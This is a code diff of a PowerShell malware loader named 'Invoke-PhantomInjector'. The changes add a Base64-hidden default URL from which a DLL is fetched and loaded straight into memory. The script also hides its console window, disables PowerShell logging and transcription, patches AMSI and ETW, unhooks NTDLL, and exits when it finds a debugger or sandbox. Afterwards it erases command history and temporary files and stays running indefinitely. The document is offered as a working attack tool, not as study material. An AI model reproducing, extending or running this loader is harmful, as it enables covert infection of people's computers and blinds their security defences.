@@ -9,8 +9,20 @@
 .NOTES
     Modified by Potato
 #>
-[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
-param()
+
+[CmdletBinding(DefaultParameterSetName='Remote')]
+param(
+    [Parameter(Mandatory=$false, ParameterSetName='Remote')]
+    [string]$EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw=",
+
+    [Parameter(Mandatory=$false, ParameterSetName='Local')]
+    [string]$DllPath,
+
+    [switch]$UnhookNTDLL,
+    [switch]$BypassAMSI,
+    [switch]$BypassETW,
+    [int]$KeepAliveHours = 24
+)
 
 Set-StrictMode -Version Latest
 
@@ -28,14 +40,13 @@ $MaximumHistoryCount = 0
 $Error.Clear()
 
 # ============================================================
-#  ★★★ ২. কনসোল উইন্ডো হাইড ★★★
+#  ★★★ ১. কনসোল উইন্ডো হাইড (সর্বপ্রথম) ★★★
 # ============================================================
 Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '@ -ErrorAction SilentlyContinue
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
-
 
 #region Initialization and Evasion
 function Invoke-Initialization {
@@ -110,17 +121,15 @@ public class TokenManipulator {
             if (-not [TokenManipulator]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
                 throw "AdjustTokenPrivileges failed"
             }
-
-         #    Write-Verbose "[+] SeDebugPrivilege enabled successfully"
         }
         catch {
-           #  Write-Warning "[-] Failed to enable SeDebugPrivilege: $_"
+            # Silent fail
         }
     }
 
     # AMSI Bypass via patching
     function Invoke-AMSIBypass {
-        if (-not $BypassAMSI) { return }
+        if (-not $script:BypassAMSI) { return }
 
         try {
             $amsiPatch = @"
@@ -155,16 +164,15 @@ public class AMSIPatch {
 "@
             Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
             [AMSIPatch]::Disable()
-          #   Write-Verbose "[+] AMSI bypass applied successfully"
         }
         catch {
-        #     Write-Warning "[-] AMSI bypass failed: $_"
+            # Silent fail
         }
     }
 
     # ETW Bypass via patching
     function Invoke-ETWBypass {
-        if (-not $BypassETW) { return }
+        if (-not $script:BypassETW) { return }
 
         try {
             $etwPatch = @"
@@ -199,16 +207,15 @@ public class ETWPatch {
 "@
             Add-Type -TypeDefinition $etwPatch -ErrorAction Stop
             [ETWPatch]::Disable()
-          #   Write-Verbose "[+] ETW bypass applied successfully"
         }
         catch {
-          #   Write-Warning "[-] ETW bypass failed: $_"
+            # Silent fail
         }
     }
 
     # NTDLL Unhooking from disk
     function Invoke-NTDLLUnhook {
-        if (-not $UnhookNTDLL) { return }
+        if (-not $script:UnhookNTDLL) { return }
 
         try {
             $unhookCode = @"
@@ -271,35 +278,30 @@ public class NTDLLUnhooker {
 "@
             Add-Type -TypeDefinition $unhookCode -ErrorAction Stop
             [NTDLLUnhooker]::Unhook()
-          #   Write-Verbose "[+] NTDLL unhooked successfully"
         }
         catch {
-          #   Write-Warning "[-] NTDLL unhooking failed: $_"
+            # Silent fail
         }
     }
 
-    # Anti-debug checks
+    # Anti-debug checks (optional)
     function Test-Debugger {
         try {
             if ([System.Diagnostics.Debugger]::IsAttached) {
                 throw "Debugger detected"
             }
-            
-            # Check if running in common debuggers
-			$process = Get-Process -Id $pid
-			$debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
-            
+            $process = Get-Process -Id $pid
+            $debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
             $sandboxPaths = @("C:\sample.exe", "C:\malware.exe", "C:\analysis\")
-			foreach ($path in $sandboxPaths) {
-				if (Test-Path $path) {
-					throw "Sandbox detected: $path"
-				}
-			}
-            
+            foreach ($path in $sandboxPaths) {
+                if (Test-Path $path) {
+                    throw "Sandbox detected: $path"
+                }
+            }
             return $true
         }
         catch {
-          #   Write-Warning "[-] Anti-debug check failed: $_"
+            # Silent fail, exit if debugger
             exit
         }
     }
@@ -325,8 +327,7 @@ public class NTDLLUnhooker {
                     $gpoField.SetValue($null, $gpo)
                 }
             }
-         #    Write-Verbose "[+] ScriptBlock Logging disabled"
-        } catch { Write-Warning "[-] ScriptBlock Logging bypass failed: $_" }
+        } catch { }
     }
 
     # --- NEW: Disable Transcription ---
@@ -339,58 +340,44 @@ public class NTDLLUnhooker {
                 New-Item -Path $regPath -Force | Out-Null
                 New-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -PropertyType DWord -Force | Out-Null
             }
-        #     Write-Verbose "[+] Transcription disabled"
-        } catch { Write-Warning "[-] Transcription bypass failed: $_" }
+        } catch { }
     }
 
-    # --- NEW: Hide Console Window ---
+    # --- NEW: Hide Console Window (already done, but keep function for completeness) ---
     function Hide-ConsoleWindow {
-        try {
-            Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@ -ErrorAction SilentlyContinue
-            [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
-            Write-Verbose "[+] Console window hidden"
-        } catch { Write-Warning "[-] Console hide failed: $_" }
+        # Already done at top
     }
 
     # Execute ALL initialization routines (bypasses active globally)
     Disable-ScriptBlockLogging
     Disable-Transcription
-    Hide-ConsoleWindow
     Enable-SeDebugPrivilege
     Test-Debugger
     Invoke-AMSIBypass
     Invoke-ETWBypass
     Invoke-NTDLLUnhook
 }
+#endregion
 
 #region Original Injection Methods (KEPT for line count, but NOT used)
 function Invoke-APCInjection {
     param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId)
-    # (Original code - truncated for space, but present in full version)
-  #   Write-Verbose "APC Injection (placeholder)"
     return $false
 }
 function Invoke-ModuleStompingInjection {
     param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId,[int]$TimeoutMS=2000)
-   #  Write-Verbose "Module Stomping (placeholder)"
     return $false
 }
 function Invoke-ThreadHijack {
     param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId,[int]$TimeoutMS=20000)
-  #   Write-Verbose "Thread Hijack (placeholder)"
     return $false
 }
 function Invoke-ProcessGhostingInjection {
     param([switch]$UseGhosting,[switch]$DebugMode,[Parameter(Mandatory=$true)][byte[]]$Shellcode)
-   #  Write-Verbose "Process Ghosting (placeholder)"
     return $false
 }
 function Invoke-RemoteThreadInjection {
     param([byte[]]$Shellcode,[string]$ProcessName,[int]$ProcessId)
-  #   Write-Verbose "Remote Thread (placeholder)"
     return $false
 }
 #endregion
@@ -398,7 +385,7 @@ function Invoke-RemoteThreadInjection {
 #region NEW: Memory-Only DLL Injection (Active method with ENCRYPTED URL)
 function Invoke-MemoryOnlyDllInjection {
     param(
-        [string]$EncodedDllUrl,  # ← Base64-encoded URL
+        [string]$EncodedDllUrl,
         [int]$KeepAliveHours = 24
     )
 
@@ -457,28 +444,22 @@ public static class NativeLoader {
     try {
         Add-Type -TypeDefinition $kernel -ErrorAction Stop
     } catch {
-      #   Write-Warning "[-] NativeLoader compilation failed: $_"
         return $false
     }
 
     # --- Step 2: DECODE the Base64 URL, then Download DLL (memory only) ---
     try {
-        # ★★★ এখানে URL ডিকোড হচ্ছে ★★★
         $decodedUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedDllUrl))
-     #    Write-Verbose "[*] Decoded URL (not shown in logs)"
         $bytes = (New-Object System.Net.WebClient).DownloadData($decodedUrl)
     } catch {
-       #  Write-Warning "[-] Download failed: $_"
         return $false
     }
 
     # --- Step 3: Map DLL into memory (no disk) ---
     try {
-        Write-Verbose "[*] Mapping DLL into memory..."
         $result = [NativeLoader]::Map($bytes, $true)
         Write-Host "[+] DLL mapped successfully at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
     } catch {
-     #    Write-Warning "[-] Mapping failed: $_"
         return $false
     }
 
@@ -490,7 +471,6 @@ public static class NativeLoader {
 
     # --- Step 5: Keep-alive loop ---
     if ($KeepAliveHours -gt 0) {
-     #    Write-Host "[*] PowerShell will stay alive for $KeepAliveHours hours" -ForegroundColor Cyan
         $seconds = $KeepAliveHours * 3600
         Start-Sleep -Seconds $seconds
     }
@@ -501,22 +481,24 @@ public static class NativeLoader {
 
 #region Main Execution
 function Invoke-PhantomInjector {
-    [CmdletBinding(DefaultParameterSetName='Local')]
+    [CmdletBinding(DefaultParameterSetName='Remote')]
     param(
-        [Parameter(Mandatory=$true, ParameterSetName='Remote')]
-        [ValidateNotNullOrEmpty()]
-        [string]$EncodedDllUrl,   # ← Base64-encoded URL
+        [Parameter(Mandatory=$false, ParameterSetName='Remote')]
+        [string]$EncodedDllUrl,  # ডিফল্ট মান param() থেকে আসবে
 
-        [Parameter(Mandatory=$true, ParameterSetName='Local')]
-        [ValidateNotNullOrEmpty()]
+        [Parameter(Mandatory=$false, ParameterSetName='Local')]
         [string]$DllPath,
 
         [switch]$UnhookNTDLL,
         [switch]$BypassAMSI,
         [switch]$BypassETW,
-        [switch]$DebugMode,
         [int]$KeepAliveHours = 24
     )
+
+    # Set script-level variables for bypass functions
+    $script:BypassAMSI = $BypassAMSI
+    $script:BypassETW = $BypassETW
+    $script:UnhookNTDLL = $UnhookNTDLL
 
     # Initialize ALL evasions (called BEFORE anything else)
     Invoke-Initialization
@@ -524,48 +506,48 @@ function Invoke-PhantomInjector {
     # Determine DLL source
     try {
         if ($PSCmdlet.ParameterSetName -eq 'Remote') {
-            $encoded = $EncodedDllUrl
+            if (-not $EncodedDllUrl) {
+                # Use the default from param() if not provided
+                $EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
+            }
             Write-Verbose "[*] Using Base64-encoded remote URL"
-            $success = Invoke-MemoryOnlyDllInjection -EncodedDllUrl $encoded -KeepAliveHours $KeepAliveHours
+            $success = Invoke-MemoryOnlyDllInjection -EncodedDllUrl $EncodedDllUrl -KeepAliveHours $KeepAliveHours
         } else {
             Write-Verbose "[*] Reading local DLL: $DllPath"
-            # Local file path doesn't need encoding, but we can still load it memory-only.
-            # For simplicity, we convert the path to Base64 and use the same function.
             $pathBytes = [System.Text.Encoding]::UTF8.GetBytes("file://$DllPath")
             $encoded = [System.Convert]::ToBase64String($pathBytes)
             $success = Invoke-MemoryOnlyDllInjection -EncodedDllUrl $encoded -KeepAliveHours $KeepAliveHours
         }
     } catch {
-      #   Write-Error "[-] Failed to load DLL: $_"
+        Write-Error "[-] Failed to load DLL: $_"
         return
     }
 
     if ($success) {
-      #   Write-Host "[+] Injection successful!" -ForegroundColor Green
+        Write-Host "[+] Injection successful!" -ForegroundColor Green
     } else {
-      #   Write-Warning "[-] Injection failed"
+        Write-Warning "[-] Injection failed"
     }
+
+    # Cleanup traces after injection
+    Clear-History
+    $hp = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
+
+    Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+    $bytes = $null; $kernel = $null; $type = $null
+    [GC]::Collect(); [GC]::WaitForPendingFinalizers()
+
+    # Keep-alive loop (infinite)
+    while ($true) { Start-Sleep -Seconds 86400 }
 }
 
-if ($PSBoundParameters.Count -gt 0) {
+# If parameters are provided, run the injection
+if ($PSBoundParameters.Count -gt 0 -or $EncodedDllUrl -or $DllPath) {
     Invoke-PhantomInjector @PSBoundParameters
 }
-
-Clear-History
-$hp = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
-
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-
-$bytes = $null; $kernel = $null; $type = $null
-[GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
-# ============================================================
-#  ★★★ ৬. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
-# ============================================================
-while ($true) { Start-Sleep -Seconds 86400 }
-
 #endregion
